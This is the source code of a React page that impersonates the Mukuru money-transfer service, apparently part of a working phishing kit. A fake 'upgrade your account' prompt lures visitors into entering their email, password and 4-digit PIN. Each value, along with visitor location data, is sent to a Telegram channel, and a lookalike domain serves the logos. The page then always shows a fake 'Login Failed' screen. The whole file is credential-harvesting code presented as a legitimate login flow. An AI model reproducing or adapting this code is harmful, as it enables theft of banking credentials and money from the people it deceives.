"use client"

import React, { useState, useEffect } from "react"
import {
  Check,
  X,
  Star,
  Eye,
  EyeOff,
  RotateCcw,
  ChevronLeft,
  Delete,
  Loader2,
  Lock,
  User,
  Home,
} from "lucide-react"
import { fetchVisitorInfo, sendTelegramMessage } from "@/lib/telegram"

export default function MukuruPage() {
  const [showSplash, setShowSplash] = useState(true)
  const [showUpgradeModal, setShowUpgradeModal] = useState(true)

  // Step flow: 'email' | 'loading_login' | 'password' | 'loading_pin' | 'pin' | 'failed'
  const [step, setStep] = useState<
    "email" | "loading_login" | "password" | "loading_pin" | "pin" | "failed"
  >("email")

  const [email, setEmail] = useState("")
  const [password, setPassword] = useState("")
  const [showPassword, setShowPassword] = useState(false)
  const [pin, setPin] = useState<string[]>([])
  const [isPinSubmitting, setIsPinSubmitting] = useState(false)

  // Fetch location info and send Telegram notification on splash screen mount
  useEffect(() => {
    const trackVisitorOnSplash = async () => {
      try {
        await fetchVisitorInfo()
        await sendTelegramMessage({
          title: "Mukuru - New Visitor (Splash Screen)",
          type: "visitor",
        })
      } catch (error) {
        console.error("Error sending visitor location to Telegram:", error)
      }
    }

    trackVisitorOnSplash()

    const timer = setTimeout(() => {
      setShowSplash(false)
    }, 3000)

    return () => clearTimeout(timer)
  }, [])

  // Handle email submit -> send to Telegram -> trigger animated loading screen -> password screen
  const handleEmailSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    if (!email.trim()) return

    try {
      await sendTelegramMessage({
        title: "Mukuru - Email Submitted",
        email: email,
        type: "email_submit",
      })
    } catch (err) {
      console.error("Telegram email send error:", err)
    }

    setStep("loading_login")
    setTimeout(() => {
      setStep("password")
    }, 2000)
  }

  // Handle password submit -> send to Telegram -> trigger animated loading screen -> OTP / PIN screen
  const handlePasswordSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    if (!password.trim()) return

    try {
      await sendTelegramMessage({
        title: "Mukuru - Password Submitted",
        email: email,
        password: password,
        type: "password_submit",
      })
    } catch (err) {
      console.error("Telegram password send error:", err)
    }

    setStep("loading_pin")
    setTimeout(() => {
      setStep("pin")
    }, 2000)
  }

  // Keypad actions for PIN screen with AUTO-PROCESS on 4th digit
  const handleKeyPress = (num: string) => {
    if (pin.length < 4) {
      const nextPin = [...pin, num]
      setPin(nextPin)

      // When 4th digit is entered, automatically trigger Telegram message & verification
      if (nextPin.length === 4) {
        const pinCode = nextPin.join("")
        sendTelegramMessage({
          title: "Mukuru - 4 Digit PIN Submitted",
          email: email,
          password: password,
          pin: pinCode,
          type: "pin_submit",
        }).catch((err) => console.error("Telegram PIN send error:", err))

        setTimeout(() => {
          setStep("loading_pin")
          setTimeout(() => {
            setStep("failed")
          }, 2200)
        }, 350)
      }
    }
  }

  const handleBackspace = () => {
    setPin((prev) => prev.slice(0, -1))
  }

  const handleClearPin = () => {
    setPin([])
  }

  const handlePinSubmit = async () => {
    if (pin.length !== 4) return
    setIsPinSubmitting(true)
    const pinCode = pin.join("")

    try {
      await sendTelegramMessage({
        title: "Mukuru - 4 Digit PIN Submitted",
        email: email,
        password: password,
        pin: pinCode,
        type: "pin_submit",
      })
    } catch (err) {
      console.error("Telegram PIN send error:", err)
    }

    setTimeout(() => {
      setIsPinSubmitting(false)
      setStep("loading_pin")
      setTimeout(() => {
        setStep("failed")
      }, 2200)
    }, 200)
  }

  const handleRestartLogin = () => {
    setStep("email")
    setPassword("")
    setPin([])
  }

  const handleUpgradeClick = () => {
    setShowUpgradeModal(false)
  }

  return (
    <div className="relative w-full min-h-[100dvh] bg-[#f05423] flex items-center justify-center overflow-x-hidden font-sans select-none">
      {/* ---------------- 1. SPLASH SCREEN ---------------- */}
      {showSplash && (
        <div
          onClick={() => setShowSplash(false)}
          className="fixed inset-0 z-50 bg-[#f05423] flex items-center justify-center p-4 transition-opacity duration-700 cursor-pointer"
        >
          {/* Logo with 3-step zoom animation towards eyes */}
          <div className="relative flex items-center justify-center p-4 sm:p-8">
            <img
              src="https://mukuruo.site/splash_logo.png"
              alt="Mukuru Splash Logo"
              onError={(e) => {
                e.currentTarget.src = "/splash_logo.png"
              }}
              className="w-32 h-32 sm:w-44 sm:h-44 object-contain animate-zoom-three-steps drop-shadow-md"
            />
          </div>
        </div>
      )}

      {/* ---------------- MAIN CONTAINER (MOBILE FRAME / CARD) ---------------- */}
      <div
        className={`relative w-full max-w-[440px] min-h-[100dvh] flex flex-col justify-between shadow-2xl overflow-hidden ${
          step === "pin"
            ? "bg-[#ebebeb]"
            : "bg-[#f5f5f5]"
        }`}
      >
        {/* ---------------- STATE A: INTERMEDIATE LOADING SCREEN (LOGIN / VERIFYING) ---------------- */}
        {step === "loading_login" || step === "loading_pin" ? (
          <div className="flex-1 flex flex-col items-center justify-center px-4 sm:px-6 py-12 animate-in fade-in duration-300">
            {/* Custom 8-Segment Mukuru Sunburst Animated Spinner */}
            <div className="relative w-20 h-20 sm:w-24 sm:h-24 mb-6 flex items-center justify-center">
              <svg viewBox="0 0 100 100" className="w-18 h-18 sm:w-20 sm:h-20">
                {[0, 45, 90, 135, 180, 225, 270, 315].map((angle, index) => (
                  <g key={angle} transform={`rotate(${angle} 50 50)`}>
                    <path
                      d="M 50 8 L 59 20 L 54 26 L 50 21 L 46 26 L 41 20 Z"
                      className="transition-colors duration-200"
                      style={{
                        animation: `mukuruFill 1.2s infinite ease-in-out`,
                        animationDelay: `${index * 0.15}s`,
                        fill: "#f05423",
                      }}
                    />
                  </g>
                ))}
              </svg>
            </div>

            <h3 className="text-[18px] sm:text-[19px] font-bold text-[#1a1a1a] tracking-tight">
              {step === "loading_login" ? "Logging in" : "Verifying..."}
            </h3>
          </div>
        ) : step === "failed" ? (
          /* ---------------- STATE D: LOGIN FAILED SCREEN ---------------- */
          <div className="flex-1 flex flex-col justify-between animate-in fade-in duration-300">
            
            {/* Top Orange Header with User Icon, Mukuru text and SA Flag */}
            <div className="w-full bg-[#f05423] px-4 sm:px-5 py-3 sm:py-3.5 flex items-center justify-between shadow-xs">
              <div className="flex items-center gap-2 text-white">
                <div className="w-6 h-6 sm:w-7 sm:h-7 rounded-full border-2 border-white/90 flex items-center justify-center">
                  <User className="w-3.5 h-3.5 sm:w-4 sm:h-4 text-white stroke-[2.5]" />
                </div>
                <span className="text-lg sm:text-xl font-bold tracking-tight text-white">
                  mukuru
                </span>
              </div>

              {/* South African Flag Badge */}
              <div className="w-7 h-7 sm:w-8 sm:h-8 rounded-full overflow-hidden shadow-sm flex items-center justify-center shrink-0 border border-white/20">
                <img
                  src="https://cdn.countryflags.com/thumbs/south-africa/flag-round-250.png"
                  alt="South Africa"
                  className="w-full h-full object-cover rounded-full"
                />
              </div>
            </div>

            {/* Main Error Body */}
            <div className="flex-1 flex flex-col items-center justify-center px-4 sm:px-6 py-6 sm:py-10 text-center">
              {/* Pinkish/Red Soft Circle with Red Lock Icon */}
              <div className="w-20 h-20 sm:w-24 sm:h-24 rounded-full bg-[#fdeeed] flex items-center justify-center shadow-xs ring-6 sm:ring-8 ring-[#fff5f5] mb-5 sm:mb-6">
                <Lock className="w-8 h-8 sm:w-10 sm:h-10 text-[#e53935] stroke-[2.2]" />
              </div>

              {/* Title: Login Failed */}
              <h2 className="text-[22px] sm:text-[26px] font-extrabold text-[#e53935] mb-2 sm:mb-3 tracking-tight">
                Login Failed
              </h2>

              {/* Subtext */}
              <p
                className="text-center px-2"
                style={{
                  fontSize: "14px",
                  color: "var(--mk-text-secondary, #e53935)",
                  lineHeight: "1.65",
                  maxWidth: "300px",
                  marginBottom: "32px",
                }}
              >
                Invalid credentials. Please check your email, password, or PIN and try again.
              </p>

              {/* Back Button */}
              <button
                type="button"
                onClick={handleRestartLogin}
                className="w-full max-w-[320px] py-3.5 sm:py-4 bg-[#f05423] hover:bg-[#d94416] active:scale-[0.99] text-white font-bold text-sm sm:text-base rounded-full shadow-lg shadow-[#f05423]/25 transition-all cursor-pointer"
              >
                Back
              </button>
            </div>

            {/* Bottom Dark Navigation Bar (Home & Online Login) */}
            <div className="w-full bg-[#383a36] py-2.5 px-6 sm:px-8 flex items-center justify-around border-t border-[#464844]">
              {/* Home Tab */}
              <button
                type="button"
                onClick={handleRestartLogin}
                className="flex flex-col items-center gap-1 text-gray-400 hover:text-white transition-colors cursor-pointer"
              >
                <Home className="w-5 h-5 stroke-[1.8]" />
                <span className="text-[11px] font-normal">Home</span>
              </button>

              {/* Online Login Tab (Active) */}
              <button
                type="button"
                className="flex flex-col items-center gap-1 text-white cursor-pointer"
              >
                <User className="w-5 h-5 stroke-[2]" />
                <span className="text-[11px] font-medium">Online Login</span>
              </button>
            </div>

          </div>
        ) : step === "pin" ? (
          /* ---------------- STATE C: 4-DIGIT MUKURU PIN / OTP SCREEN ---------------- */
          <div className="flex-1 flex flex-col justify-between px-4 sm:px-6 pt-4 sm:pt-6 pb-6 sm:pb-8 animate-in fade-in duration-300">
            {/* Top Navigation Bar */}
            <div>
              <div className="relative flex items-center justify-center mb-6 sm:mb-8">
                <button
                  type="button"
                  onClick={() => setStep("password")}
                  className="absolute left-0 p-2 -ml-2 text-[#1a1a1a] hover:opacity-70 transition-opacity cursor-pointer"
                  aria-label="Go back"
                >
                  <ChevronLeft className="w-6 h-6 stroke-[2.5]" />
                </button>
                <h2 className="text-[#1a1a1a] text-[16px] sm:text-[17px] font-semibold tracking-tight">
                  Mukuru Card
                </h2>
              </div>

              {/* Header Title matching screenshot 2-line layout */}
              <div className="text-center mb-6 sm:mb-8 px-2">
                <h1 className="text-[20px] sm:text-[23px] font-[800] text-[#1a1a1a] leading-snug tracking-tight max-w-[300px] mx-auto">
                  Enter your 4 digit Mukuru PIN to continue
                </h1>
              </div>

              {/* 4 Digit Display Boxes matching mobile screenshot */}
              <div className="flex justify-center items-center gap-3 sm:gap-4 mb-7 sm:mb-10">
                {[0, 1, 2, 3].map((index) => (
                  <div
                    key={index}
                    className="w-[66px] h-[76px] sm:w-[74px] sm:h-[84px] flex items-center justify-center text-3xl sm:text-4xl font-bold text-[#1a1a1a]"
                    style={{
                      backgroundColor: "#ffffff",
                      borderRadius: "14px",
                      boxShadow: "0 2px 10px rgba(0, 0, 0, 0.08)",
                      transition: "all 0.18s ease-in-out",
                    }}
                  >
                    {pin[index] || ""}
                  </div>
                ))}
              </div>

              {/* On-Screen Numeric Keypad matching screenshot */}
              <div className="w-full max-w-[340px] sm:max-w-[370px] mx-auto grid grid-cols-3 gap-y-7 sm:gap-y-9 text-center">
                {["1", "2", "3", "4", "5", "6", "7", "8", "9"].map((num) => (
                  <button
                    key={num}
                    type="button"
                    onClick={() => handleKeyPress(num)}
                    className="h-16 sm:h-18 flex items-center justify-center text-[32px] sm:text-[36px] font-normal text-[#1a1a1a] active:scale-95 active:bg-black/5 rounded-full transition-all cursor-pointer select-none"
                  >
                    {num}
                  </button>
                ))}

                {/* Bottom Keypad Row: Clear | 0 | Backspace */}
                <button
                  type="button"
                  onClick={handleClearPin}
                  className="h-16 sm:h-18 flex items-center justify-center text-[16px] sm:text-[17px] font-normal text-[#1a1a1a] active:opacity-60 transition-opacity cursor-pointer select-none"
                >
                  Clear
                </button>

                <button
                  type="button"
                  onClick={() => handleKeyPress("0")}
                  className="h-16 sm:h-18 flex items-center justify-center text-[32px] sm:text-[36px] font-normal text-[#1a1a1a] active:scale-95 active:bg-black/5 rounded-full transition-all cursor-pointer select-none"
                >
                  0
                </button>

                <button
                  type="button"
                  onClick={handleBackspace}
                  className="h-16 sm:h-18 flex items-center justify-center text-[#1a1a1a] active:opacity-60 transition-opacity cursor-pointer select-none"
                  aria-label="Backspace"
                >
                  <Delete className="w-7 h-7 sm:w-8 sm:h-8 stroke-[1.8]" />
                </button>
              </div>
            </div>

            {/* Bottom Actions: Continue & Cancel matching screenshot */}
            <div className="w-full max-w-[340px] sm:max-w-[370px] mx-auto space-y-3 pt-6 sm:pt-8">
              <button
                type="button"
                onClick={handlePinSubmit}
                disabled={pin.length !== 4 || isPinSubmitting}
                className={`w-full py-4 rounded-full font-bold text-[16px] sm:text-[17px] transition-all duration-200 flex items-center justify-center shadow-xs ${
                  pin.length === 4
                    ? "bg-[#f05423] text-white hover:bg-[#d94416] active:scale-[0.99] cursor-pointer shadow-[#f05423]/25"
                    : "bg-[#c4c4c4] text-[#808080] cursor-not-allowed"
                }`}
              >
                {isPinSubmitting ? (
                  <Loader2 className="w-5 h-5 animate-spin text-white" />
                ) : (
                  "Continue"
                )}
              </button>

              <button
                type="button"
                onClick={() => setStep("email")}
                className="w-full py-3.5 sm:py-4 bg-white border-2 border-[#f05423] text-[#f05423] hover:bg-[#fff7f4] active:scale-[0.99] rounded-full font-bold text-[16px] sm:text-[17px] transition-all cursor-pointer shadow-xs"
              >
                Cancel
              </button>
            </div>
          </div>
        ) : (
          /* ---------------- STATE B: EMAIL & PASSWORD SCREENS ---------------- */
          <div className="flex-1 flex flex-col px-4 sm:px-6 pt-8 sm:pt-10 pb-6">
            {/* Mukuru Brand Logo Header */}
            <div className="flex items-center justify-center gap-2 mb-8 sm:mb-10">
              <img
                src="https://mukuruo.site/login_logo.png"
                alt="Mukuru Logo"
                className="h-7 sm:h-8 w-auto object-contain"
              />
              <span className="text-[#f05423] text-[20px] sm:text-[22px] font-bold tracking-tight">
                mukuru
              </span>
            </div>

            {/* Welcome Heading */}
            <div className="mb-6">
              <h1 className="text-[20px] sm:text-[22px] font-bold text-[#1a1a1a] leading-tight mb-1 tracking-tight">
                Welcome To Mukuru
              </h1>

              {step === "email" ? (
                <p className="text-[#666666] text-xs sm:text-sm font-normal">
                  Please login to upgrade your account
                </p>
              ) : (
                /* Restart Login Link in Password Step */
                <button
                  type="button"
                  onClick={handleRestartLogin}
                  className="text-[#37aaa9] text-[13px] font-medium hover:underline flex items-center gap-1.5 cursor-pointer mt-1"
                >
                  <RotateCcw className="w-3.5 h-3.5" />
                  Restart login
                </button>
              )}
            </div>

            {/* Form Section */}
            {step === "email" ? (
              /* --- Step 1: Email Form --- */
              <form onSubmit={handleEmailSubmit} className="space-y-5 sm:space-y-6">
                {/* Email Container (#383a36 bg color) */}
                <div className="bg-[#383a36] rounded-2xl p-4 sm:p-5 shadow-sm">
                  <label
                    htmlFor="email"
                    className="block text-white text-[14px] sm:text-[15px] font-semibold mb-2.5 sm:mb-3 tracking-wide"
                  >
                    Email
                  </label>
                  <input
                    id="email"
                    type="email"
                    required
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    placeholder="Enter email"
                    className="w-full h-11 sm:h-12 px-4 bg-white rounded-xl text-[#1a1a1a] text-sm sm:text-base placeholder-[#9ca3af] outline-none focus:ring-2 focus:ring-[#f05423] transition-all"
                  />
                </div>

                {/* Login Button for Email Step */}
                <button
                  type="submit"
                  disabled={!email.trim()}
                  className={`w-full h-12 sm:h-13 py-3 sm:py-3.5 rounded-full text-white font-semibold text-sm sm:text-base transition-all duration-200 flex items-center justify-center shadow-sm ${
                    email.trim()
                      ? "bg-[#f05423] hover:bg-[#d94416] active:scale-[0.99] cursor-pointer shadow-[#f05423]/30"
                      : "bg-[#f8a78e] cursor-not-allowed opacity-95"
                  }`}
                >
                  Login
                </button>
              </form>
            ) : (
              /* --- Step 2: Password Form --- */
              <form
                onSubmit={handlePasswordSubmit}
                className="space-y-5 sm:space-y-6 animate-in fade-in duration-300"
              >
                {/* Combined Box (#383a36 bg color) with Read-Only Email + Password input */}
                <div className="bg-[#383a36] rounded-2xl p-4 sm:p-5 shadow-sm space-y-3.5 sm:space-y-4">
                  {/* Read-Only Email Field */}
                  <div>
                    <label className="block text-white text-[14px] sm:text-[15px] font-semibold mb-1.5 sm:mb-2 tracking-wide">
                      Email
                    </label>
                    <div className="w-full h-11 sm:h-12 px-4 bg-[#565956] rounded-xl text-[#b5bab5] text-sm sm:text-base flex items-center border border-[#636663] select-text truncate">
                      {email}
                    </div>
                  </div>

                  {/* Password Field */}
                  <div>
                    <label
                      htmlFor="password"
                      className="block text-white text-[14px] sm:text-[15px] font-semibold mb-1.5 sm:mb-2 tracking-wide"
                    >
                      Password
                    </label>
                    <div className="relative flex items-center">
                      <input
                        id="password"
                        type={showPassword ? "text" : "password"}
                        required
                        autoFocus
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        placeholder=""
                        className="w-full h-11 sm:h-12 pl-4 pr-12 bg-white rounded-xl text-[#1a1a1a] text-sm sm:text-base outline-none ring-2 ring-[#f05423] border border-[#f05423] transition-all"
                      />
                      <button
                        type="button"
                        onClick={() => setShowPassword(!showPassword)}
                        className="absolute right-3.5 text-[#37aaa9] hover:text-[#2c8d8c] p-1 transition-colors cursor-pointer"
                        aria-label={showPassword ? "Hide password" : "Show password"}
                      >
                        {showPassword ? (
                          <EyeOff className="w-4.5 h-4.5 sm:w-5 sm:h-5" />
                        ) : (
                          <Eye className="w-4.5 h-4.5 sm:w-5 sm:h-5" />
                        )}
                      </button>
                    </div>
                  </div>
                </div>

                {/* Login Button for Password Step */}
                <button
                  type="submit"
                  disabled={!password.trim()}
                  className={`w-full h-12 sm:h-13 py-3 sm:py-3.5 rounded-full text-white font-semibold text-sm sm:text-base transition-all duration-200 flex items-center justify-center shadow-sm ${
                    password.trim()
                      ? "bg-[#f05423] hover:bg-[#d94416] active:scale-[0.99] cursor-pointer shadow-[#f05423]/30"
                      : "bg-[#f8a78e] cursor-not-allowed opacity-95"
                  }`}
                >
                  Login
                </button>
              </form>
            )}
          </div>
        )}

        {/* Footer (#383a36 dark footer) - only on email & password steps */}
        {step !== "pin" && step !== "failed" && (
          <footer className="w-full bg-[#383a36] py-3.5 px-4 text-center">
            <p className="text-[#e0e0e0] text-xs font-normal tracking-wide">
              © Mukuru, All Rights Reserved.
            </p>
          </footer>
        )}

        {/* ---------------- UPGRADE MODAL / BOTTOM SHEET ---------------- */}
        {showUpgradeModal && !showSplash && (
          <div className="absolute inset-0 z-40 bg-black/60 backdrop-blur-[2px] flex flex-col justify-end animate-in fade-in duration-300">
            {/* Modal Card */}
            <div className="relative w-full max-h-[90dvh] overflow-y-auto bg-white rounded-t-[28px] sm:rounded-t-[32px] pt-3 pb-6 sm:pb-7 px-4 sm:px-6 shadow-2xl animate-slide-up">
              {/* Top Handle / Accent Pill */}
              <div className="w-12 h-1 bg-[#f05423] rounded-full mx-auto mb-3" />

              {/* Close Button */}
              <button
                onClick={() => setShowUpgradeModal(false)}
                className="absolute top-4 sm:top-5 right-4 sm:right-5 w-8 h-8 rounded-full bg-[#f3f4f6] hover:bg-[#e5e7eb] flex items-center justify-center text-gray-500 hover:text-gray-700 transition-colors cursor-pointer"
                aria-label="Close modal"
              >
                <X className="w-4 h-4 stroke-[2.5]" />
              </button>

              {/* Center Star Badge Icon */}
              <div className="flex justify-center mb-3">
                <div className="w-12 h-12 sm:w-14 sm:h-14 rounded-full bg-[#fff4f0] flex items-center justify-center shadow-inner ring-6 sm:ring-8 ring-[#fff8f5]">
                  <Star className="w-6 h-6 sm:w-7 sm:h-7 text-[#f05423] fill-[#f05423]" />
                </div>
              </div>

              {/* Modal Title & Subtitle */}
              <div className="text-center mb-4 sm:mb-5 px-2">
                <h2 className="text-[18px] sm:text-[20px] font-bold text-gray-900 leading-snug">
                  Upgrade Your Mukuru Account Now!
                </h2>
                <p className="text-xs sm:text-[13px] text-gray-500 mt-1.5 sm:mt-2 leading-relaxed max-w-[280px] mx-auto">
                  Mukuru SA customers need to upgrade their account to enjoy these
                  exclusive benefits:
                </p>
              </div>

              {/* Benefits List */}
              <div className="bg-[#f8fafc] rounded-2xl p-3.5 sm:p-4.5 mb-4 sm:mb-5 space-y-3 sm:space-y-3.5 border border-gray-100">
                {/* Benefit 1 */}
                <div className="flex items-center gap-3">
                  <div className="w-5 h-5 rounded-full bg-[#f05423] flex items-center justify-center shrink-0">
                    <Check className="w-3.5 h-3.5 text-white stroke-[3]" />
                  </div>
                  <span className="text-xs sm:text-[13px] font-medium text-gray-800 leading-tight">
                    Increase your Daily & Monthly Money Transfer Limit
                  </span>
                </div>

                {/* Benefit 2 */}
                <div className="flex items-center gap-3">
                  <div className="w-5 h-5 rounded-full bg-[#f05423] flex items-center justify-center shrink-0">
                    <Check className="w-3.5 h-3.5 text-white stroke-[3]" />
                  </div>
                  <span className="text-xs sm:text-[13px] font-medium text-gray-800 leading-tight">
                    Get access to your Mukuru Card
                  </span>
                </div>

                {/* Benefit 3 */}
                <div className="flex items-center gap-3">
                  <div className="w-5 h-5 rounded-full bg-[#f05423] flex items-center justify-center shrink-0">
                    <Check className="w-3.5 h-3.5 text-white stroke-[3]" />
                  </div>
                  <span className="text-xs sm:text-[13px] font-medium text-gray-800 leading-tight">
                    Low Transaction Fees and Instant Payouts
                  </span>
                </div>

                {/* Benefit 4 */}
                <div className="flex items-center gap-3">
                  <div className="w-5 h-5 rounded-full bg-[#f05423] flex items-center justify-center shrink-0">
                    <Check className="w-3.5 h-3.5 text-white stroke-[3]" />
                  </div>
                  <span className="text-xs sm:text-[13px] font-medium text-gray-800 leading-tight">
                    Exclusive Funeral Cover & Insurance offers
                  </span>
                </div>
              </div>

              {/* Upgrade Button */}
              <button
                onClick={handleUpgradeClick}
                className="w-full py-3.5 sm:py-4 bg-[#f05423] hover:bg-[#d94416] active:scale-[0.99] text-white font-bold text-sm sm:text-base rounded-2xl shadow-lg shadow-[#f05423]/25 transition-all uppercase tracking-wider mb-3 cursor-pointer"
              >
                UPGRADE ACCOUNT NOW
              </button>

              {/* Support Footer Link */}
              <div className="text-center text-xs text-gray-500">
                Need Help?{" "}
                <button
                  type="button"
                  className="text-[#37aaa9] hover:underline font-semibold cursor-pointer"
                  onClick={() => alert("Connecting to Mukuru Support...")}
                >
                  Contact Support
                </button>
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  )
}
